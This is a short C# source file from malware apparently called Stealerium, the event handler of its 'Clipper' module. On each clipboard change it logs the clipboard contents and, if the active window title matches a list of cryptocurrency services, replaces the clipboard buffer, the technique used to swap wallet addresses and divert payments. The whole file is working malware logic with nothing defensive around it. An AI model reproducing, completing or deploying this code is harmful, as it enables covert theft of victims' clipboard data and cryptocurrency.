using Stealerium.Modules;

namespace Stealerium.Clipper
{
    internal sealed class EventManager
    {
        // Make something when clipboard content is changed
        public static void Action()
        {
            Logger.SaveClipboard(); // Log string
            // Start clipper only if active windows contains target values
            if (Detect()) Buffer.Replace();
        }

        // Detect target data in active window
        private static bool Detect()
        {
            foreach (var text in Config.CryptoServices)
                if (WindowManager.ActiveWindow.ToLower().Contains(text))
                    return true;

            return false;
        }
    }
}